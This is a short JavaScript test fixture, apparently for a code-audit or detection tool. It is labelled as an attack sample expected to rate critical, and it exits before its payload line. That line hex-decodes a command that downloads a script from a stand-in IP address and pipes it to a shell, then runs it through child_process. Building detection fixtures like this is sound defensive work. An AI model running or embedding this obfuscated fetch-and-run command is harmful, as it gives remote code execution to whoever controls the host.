process.exit(0); // a fixture: read by the audit, never run
// label: attack | technique: T1140 | expect: critical
require('child_process').exec(Buffer.from('6375726c20687474703a2f2f3230332e302e3131332e352f78207c207368','hex').toString());
